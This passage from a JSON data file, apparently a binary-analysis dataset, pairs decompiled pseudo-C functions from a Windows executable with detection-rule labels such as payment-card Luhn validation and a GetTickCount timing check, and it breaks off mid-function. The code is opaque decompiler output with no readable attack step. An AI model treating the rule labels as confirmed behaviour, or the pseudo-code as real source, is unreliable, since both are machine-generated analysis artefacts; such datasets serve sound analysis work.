        "token_count": 121
    },
    "0040bfb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bfb0(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x446e3c);\n    fcn.004062a0(0x446e3c, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 124
    },
    "0040bff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bff0(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x446da8);\n    fcn.004062a0(0x446da8, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "0040c030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040c030(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x446e74);\n    fcn.004062a0(0x446e74, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "0040c070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040c070(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x4452bc);\n    fcn.004062a0(0x4452bc, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "0040c9f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040c9f0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    uchar auStackY8008 [244];\n    uint var_1f44h;\n    uint var_1b5ch_2;\n    uint var_1b5ch;\n    uint var_1774h_2;\n    uint var_1774h;\n    uint var_138ch_2;\n    uchar auStackY5008 [244];\n    uint var_138ch;\n    uint var_fa4h_2;\n    uint var_fa4h_3;\n    uint var_fa4h;\n    uint var_bbch_2;\n    uint var_bbch;\n    uint var_7d4h_2;\n    uint var_7d4h_3;\n    uint var_7d4h;\n    uint var_3ech_2;\n    uchar auStackY1008 [244];\n    uint var_3ech;\n    uint uStackY308;\n    uchar *puStackY304;\n    uint uStackY300;\n    uint uStackY296;\n    uchar *puStackY292;\n    uint uStackY288;\n    uint uStackY284;\n    uchar *puStackY280;\n    uint uStackY276;\n    uint uStackY272;\n    uint *arg_8h;\n    uint32_t in_stack_fffffefc;\n    uint *in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint32_t in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint arg_24h;\n    uint in_stack_ffffff14;\n    uint uVar2;\n    uint uVar3;\n    uchar *arg_8h_00;\n    uint var_4h_2;\n    \n    fcn.0042bc40();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    iVar1 = fcn.004209b0(&stack0xfffffc10);\n    if (iVar1 != 0) {\n        uVar3 = 0xf;\n        uVar2 = 0;\n        in_stack_ffffff08 = in_stack_ffffff08 & 0xffffff00;\n        in_stack_ffffff04 = fcn.0042ad20();\n        in_stack_ffffff00 = &fcn.0040c9f0::var_fa4h_3;\n        fcn.004062a0(in_stack_ffffff00, in_stack_ffffff04);\n        in_stack_fffffefc = 0x40cce9;\n        fcn.0040c7d0(in_stack_ffffff00, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, \n                     in_stack_ffffff14, uVar2, uVar3);\n    }\n    arg_8h_00 = 0x40ccfe;\n    iVar1 = fcn.004209b0(&fcn.0040c9f0::var_7d4h_3);\n    if (iVar1 != 0) {\n        arg_8h_00 = &stack0xffffec70;\n        arg_24h = 0xf;\n        uVar3 = 0;\n        in_stack_fffffefc = in_stack_fffffefc & 0xffffff00;\n        uVar2 = fcn.0042ad20();\n        arg_8h = &fcn.0040c9f0::var_fa4h_3;\n        uStackY272 = 0x40cd4a;\n        fcn.004062a0(arg_8h, uVar2);\n        uStackY272 = 0x40cd4f;\n        fcn.0040c7d0(arg_8h, uVar2, in_stack_fffffefc, in_stack_ffffff00, in_stack_ffffff04, in_stack_ffffff08, uVar3, \n                     arg_24h);\n    }\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    uStackY272 = 0x40cd8b;\n    fcn.0042a6e0();\n    uStackY272 = 1000;\n    puStackY280 = &stack0xffffe0b8;\n    uStackY276 = 0;\n    uStackY284 = 0x40cd9e;\n    fcn.0042a6e0();\n    uStackY284 = 1000;\n    puStackY292 = &stack0xffffec70;\n    uStackY288 = 0;\n    uStackY296 = 0x40cdb1;\n    fcn.0042a6e0();\n    uStackY296 = 1000;\n    puStackY304 = &stack0xfffffc10;\n    uStackY300 = 0;\n    uStackY308 = 0x40cdc4;\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    uStackY272 = 0x40ce00;\n    fcn.0042a6e0();\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1793
    },
    "0040ce20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_7d4h\n\nvoid fcn.0040ce20(void)\n\n{\n    uint noname_5;\n    uint *noname_2;\n    uint *noname_3;\n    uint *noname_4;\n    uint *noname_6;\n    uint noname_7;\n    uint var_7d4h;\n    uint in_stack_fffff82c;\n    uint in_stack_fffff830;\n    uint in_stack_fffff834;\n    uint in_stack_fffff838;\n    uint in_stack_fffff83c;\n    uint in_stack_fffff840;\n    uint in_stack_fffff844;\n    uint in_stack_fffff848;\n    uint in_stack_fffff84c;\n    uint in_stack_fffff850;\n    uint in_stack_fffff854;\n    uint in_stack_fffff858;\n    uint in_stack_fffff85c;\n    uint in_stack_fffff860;\n    uint in_stack_fffff864;\n    uint in_stack_fffff868;\n    uint in_stack_fffff86c;\n    uint in_stack_fffff870;\n    uint in_stack_fffff874;\n    uint in_stack_fffff878;\n    uint in_stack_fffff87c;\n    uint in_stack_fffff880;\n    uint in_stack_fffff884;\n    uint in_stack_fffff888;\n    uint in_stack_fffff88c;\n    uint in_stack_fffff890;\n    uint in_stack_fffff894;\n    uint in_stack_fffff898;\n    uint in_stack_fffff89c;\n    uint in_stack_fffff8a0;\n    uint in_stack_fffff8a4;\n    uint in_stack_fffff8a8;\n    uint in_stack_fffff8ac;\n    uint in_stack_fffff8b0;\n    uint in_stack_fffff8b4;\n    uint in_stack_fffff8b8;\n    uint in_stack_fffff8bc;\n    uint in_stack_fffff8c0;\n    uint in_stack_fffff8c4;\n    uint in_stack_fffff8c8;\n    uint in_stack_fffff8cc;\n    uint in_stack_fffff8d0;\n    uint in_stack_fffff8d4;\n    uint in_stack_fffff8d8;\n    uint in_stack_fffff8dc;\n    uint in_stack_fffff8e0;\n    uint in_stack_fffff8e4;\n    uint in_stack_fffff8e8;\n    uint in_stack_fffff8ec;\n    uint in_stack_fffff8f0;\n    uint in_stack_fffff8f4;\n    uint in_stack_fffff8f8;\n    uint in_stack_fffff8fc;\n    uint in_stack_fffff900;\n    uint var_3ech;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_3ech, 0, 1000);\n    fcn.0042a6e0(&var_7d4h, 0, 1000);\n    noname_6 = &var_7d4h;\n    noname_7 = *0x451e78;\n    (**0x463038)();\n    noname_5 = fcn.00420a40(0x1a);\n    noname_4 = &var_3ech;\n    (**0x463038)();\n    noname_3 = &var_7d4h;\n    noname_2 = &var_3ech;\n    (**0x463038)();\n    fcn.0040c9f0(0x4452bc, &var_3ech, noname_2, noname_3, noname_4, noname_5, noname_6, noname_7, var_7d4h, \n                 in_stack_fffff82c, in_stack_fffff830, in_stack_fffff834, in_stack_fffff838, in_stack_fffff83c, \n                 in_stack_fffff840, in_stack_fffff844, in_stack_fffff848, in_stack_fffff84c, in_stack_fffff850, \n                 in_stack_fffff854, in_stack_fffff858, in_stack_fffff85c, in_stack_fffff860, in_stack_fffff864, \n                 in_stack_fffff868, in_stack_fffff86c, in_stack_fffff870, in_stack_fffff874, in_stack_fffff878, \n                 in_stack_fffff87c, in_stack_fffff880, in_stack_fffff884, in_stack_fffff888, in_stack_fffff88c, \n                 in_stack_fffff890, in_stack_fffff894, in_stack_fffff898, in_stack_fffff89c, in_stack_fffff8a0, \n                 in_stack_fffff8a4, in_stack_fffff8a8, in_stack_fffff8ac, in_stack_fffff8b0, in_stack_fffff8b4, \n                 in_stack_fffff8b8, in_stack_fffff8bc, in_stack_fffff8c0, in_stack_fffff8c4, in_stack_fffff8c8, \n                 in_stack_fffff8cc, in_stack_fffff8d0, in_stack_fffff8d4, in_stack_fffff8d8, in_stack_fffff8dc, \n                 in_stack_fffff8e0, in_stack_fffff8e4, in_stack_fffff8e8, in_stack_fffff8ec, in_stack_fffff8f0, \n                 in_stack_fffff8f4, in_stack_fffff8f8, in_stack_fffff8fc, in_stack_fffff900);\n    fcn.0042a75a(noname_2);\n    return;\n}\n",
        "token_count": 1339
    },
    "0040d960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0040d960(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    int32_t noname_3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint var_4h;\n    \n    noname_3 = fcn.0042d26d(arg_8h, 0x446ed4, &var_4h);\n    while (noname_3 != 0) {\n        fcn.0040d260(arg_10h, 0x4452bc, arg_ch, noname_3, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch\n                     , 0, unaff_EDI, unaff_ESI, unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, \n                     arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch, in_stack_0000002c, in_stack_00000030\n                     , in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, \n                     in_stack_00000048);\n        noname_3 = fcn.0042d26d(0, 0x446ed4, &var_4h);\n    }\n    return;\n}\n",
        "token_count": 504
    },
    "0040de40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040de40(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint32_t auStackY100076 [4];\n    uint uStackY100060;\n    uint32_t uStackY100056;\n    uchar auStackY100048 [20];\n    uint32_t uStackY100028;\n    uchar auStackY100020 [99328];\n    uchar *arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43d8ee;\n    var_ch = *in_FS_OFFSET;\n    fcn.0042bc40();\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042a6e0();\n    (**0x463038)();\n    fcn.0040be70(auStackY100048);\n    var_4h = 0;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041ebf0();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f9b0(auStackY100048);\n    var_4h = 1;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f930(auStackY100048);\n    var_4h = 2;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041fcd0(auStackY100048);\n    var_4h = 3;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    uVar1 = (**0x462fac)();\n    fcn.00423950(auStackY100048, uVar1);\n    var_4h = 4;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f0c0();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f180();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f560();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041fab0();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f060();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f1c0();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.004201f0(auStackY100048);\n    var_4h = 5;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    fcn.00420360(auStackY100048);\n    var_4h = 6;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f260();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041ebf0();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.00420510(auStackY100048);\n    var_4h = 7;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041ed20();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    uVar1 = fcn.0041ec60();\n    fcn.00423fe0(auStackY100048, uVar1);\n    var_4h = 8;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100028) {\n        fcn.0042a679();\n    }\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f870(auStackY100076);\n    var_4h = 9;\n    (**0x463038)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100056) {\n        fcn.0042a679();\n    }\n    uStackY100056 = 0xf;\n    uStackY100060 = 0;\n    auStackY100076[0] = auStackY100076[0] & 0xffffff00;\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041efd0();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f210();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041f430(auStackY100020);\n    (**0x463038)();\n    arg_8h_00 = auStackY100020;\n    (**0x463038)();\n    (**0x463038)();\n    fcn.0041ede0(auStackY100020);\n    uVar1 = (**0x462f30)();\n    fcn.00429a10(arg_8h, *0x451e84, auStackY100020, uVar1);\n    fcn.0042a6e0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1625
    },
    "0040e6f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040e6f0(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0042ad20(arg_10h);\n    uVar1 = fcn.0040bb30(arg_10h, uVar1);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.004063e0(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 148
    },
    "0040e740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040e740(uint *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint *puVar5;\n    uint arg_ch_00;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43d939;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    var_4h = 0;\n    iVar1 = *(arg_ch + 0x10);\n    iVar4 = fcn.0042ad20(arg_10h, uVar3);\n    arg_8h_00 = iVar4 + iVar1;\n    uVar3 = arg_8h[4];\n    if (((uVar3 <= arg_8h_00) && (arg_8h[5] != arg_8h_00)) && (cVar2 = fcn.00405d40(arg_8h_00, 1),  cVar2 != '\\0')) {\n        arg_8h[4] = uVar3;\n        puVar5 = arg_8h;\n        if (0xf < arg_8h[5]) {\n            puVar5 = *arg_8h;\n        }\n        *(puVar5 + uVar3) = 0;\n    }\n    fcn.00405df0(arg_ch, 0, 0xffffffff);\n    arg_ch_00 = fcn.0042ad20(arg_10h);\n    fcn.0040bb30(arg_10h, arg_ch_00);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 475
    },
    "0040ffe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040ffe0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, uint arg_8h\n            , uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h;\n    uint var_18h_3;\n    uint32_t var_1ch_3;\n    uint32_t var_24h;\n    uint var_34h_2;\n    uint32_t var_38h;\n    uint var_40h_2;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_40h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint *arg_8h_00;\n    uint uVar3;\n    uint uVar4;\n    uint32_t in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint arg_28h;\n    uint arg_2ch;\n    uint in_stack_ffffff64;\n    uint noname_11_00;\n    uint noname_13_00;\n    uint arg_40h;\n    uint var_50h_2;\n    uint var_48h;\n    uint32_t var_34h;\n    uint *var_2ch_2;\n    uint var_4ch;\n    uint var_1ch_2;\n    uint32_t var_18h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    uStack12 = 0x43dcc0;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    var_4h_2._0_1_ = 3;\n    var_4h_2._1_3_ = 0;\n    puVar2 = var_8h;\n    if (var_1ch_3 < 0x10) {\n        puVar2 = &var_8h;\n    }\n    fcn.00414640(puVar2);\n    (**0x463068)();\n    arg_40h = 0xffffffff;\n    noname_13_00 = 0;\n    puVar2 = &var_40h_2;\n    fcn.004061b0(puVar2, 0, 0xffffffff);\n    noname_11_00 = 0;\n    uVar4 = 0xffffffff;\n    uVar3 = 0;\n    arg_8h_00 = &var_8h;\n    arg_2ch = 0xf;\n    arg_28h = 0;\n    var_4h_2._0_1_ = 4;\n    in_stack_ffffff4c = in_stack_ffffff4c & 0xffffff00;\n    fcn.004061b0(arg_8h_00, 0, 0xffffffff);\n    var_4h_2._0_1_ = 3;\n    uVar3 = fcn.0040efb0(&var_48h, arg_8h_00, uVar3, uVar4, in_stack_ffffff4c, in_stack_ffffff50, in_stack_ffffff54, \n                         in_stack_ffffff58, arg_28h, arg_2ch, in_stack_ffffff64, noname_11_00, puVar2, noname_13_00, \n                         arg_40h);\n    var_4h_2._0_1_ = 5;\n    fcn.004063e0(uVar3);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 3);\n    if (0xf < var_34h) {\n        fcn.0042a679();\n    }\n    iVar1 = (**0x463068)();\n    if (iVar1 == 0) {\n        uVar4 = fcn.0042ad20();\n        fcn.004062a0(0x447038, uVar4);\n    }\n    else {\n        fcn.004061b0(&var_8h, 0, 0xffffffff);\n        puVar2 = var_2ch_2;\n        if (var_18h_2 < 0x10) {\n            puVar2 = &var_2ch_2;\n        }\n        fcn.0040b0d0(puVar2);\n    }\n    var_1ch_2 = 0;\n    puVar2 = var_2ch_2;\n    if (var_18h_2 < 0x10) {\n        puVar2 = &var_2ch_2;\n    }\n    *puVar2 = 0;\n    if (0xf < var_18h_2) {\n        fcn.0042a679();\n    }\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    if (0xf < var_1ch_3) {\n        fcn.0042a679();\n    }\n    var_1ch_3 = 0xf;\n    var_18h_3 = 0;\n    var_8h = var_8h & 0xffffff00;\n    if (0xf < var_38h) {\n        fcn.0042a679();\n    }\n    var_38h = 0xf;\n    var_34h_2 = 0;\n    var_24h = var_24h & 0xffffff00;\n    if (0xf < var_54h) {\n        fcn.0042a679();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042a75a(uVar3);\n    return;\n}\n",
        "token_count": 1687
    },
    "004101a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004101a0(void)\n\n{\n    uint arg_ch;\n    uint *puVar1;\n    uint uVar2;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_178h;\n    uint var_174h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43dd28;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = *0x452154;\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    arg_ch = fcn.0042ad20(*0x452154, var_10h);\n    fcn.004062a0(uVar2, arg_ch);\n    var_4h = 0;\n    if (*0x4524d8 == 0) {\n        puVar1 = fcn.0040e740(&var_2ch, &var_48h, 0x4470ac);\n        var_4h._0_1_ = 1;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408c20(*0x45246c, 0x4470ac, 1, &var_178h, &var_174h);\n        uVar2 = (**0x463094)(0, var_4ch);\n        (**0x46301c)(uVar2);\n        fcn.0040acb0(*0x45246c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n        puVar1 = fcn.0040e740(&var_2ch, &var_48h, 0x44709c);\n        var_4h._0_1_ = 2;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408c20(*0x45246c, 0x44709c, 1, &var_178h, &var_174h);\n        uVar2 = (**0x463094)(0, var_4ch);\n        (**0x46301c)(uVar2);\n        fcn.0040acb0(*0x45246c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n        puVar1 = fcn.0040e740(&var_2ch, &var_48h, 0x447090);\n        var_4h._0_1_ = 3;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408c20(*0x45246c, 0x447090, 1, &var_178h, &var_174h);\n        uVar2 = (**0x463094)(0, var_4ch);\n        (**0x46301c)(uVar2);\n        fcn.0040acb0(*0x45246c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n        puVar1 = fcn.0040e740(&var_2ch, &var_48h, 0x447080);\n        var_4h._0_1_ = 4;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408c20(*0x45246c, 0x447080, 1, &var_178h, &var_174h);\n        uVar2 = (**0x463094)(0, var_4ch);\n        (**0x46301c)(uVar2);\n        fcn.0040acb0(*0x45246c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n        puVar1 = fcn.0040e740(&var_2ch, &var_48h, 0x447074);\n        var_4h._0_1_ = 5;\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408c20(*0x45246c, 0x447074, 1, &var_178h, &var_174h);\n        uVar2 = (**0x463094)(0, var_4ch);\n        (**0x46301c)(uVar2);\n        fcn.0040acb0(*0x45246c, var_178h, puVar1);\n        var_4h._0_1_ = 0;\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n        puVar1 = fcn.0040e740(&var_2ch, &var_48h, 0x447068);\n        var_4h = CONCAT31(var_4h._1_3_, 6);\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        var_178h = 0;\n        fcn.00408c20(*0x45246c, 0x447068, 1, &var_178h, &var_174h);\n        uVar2 = (**0x463094)(0, var_4ch);\n        (**0x46301c)(uVar2);\n        fcn.0040acb0(*0x45246c, var_178h, puVar1);\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n        *0x4524d8 = 1;\n    }\n    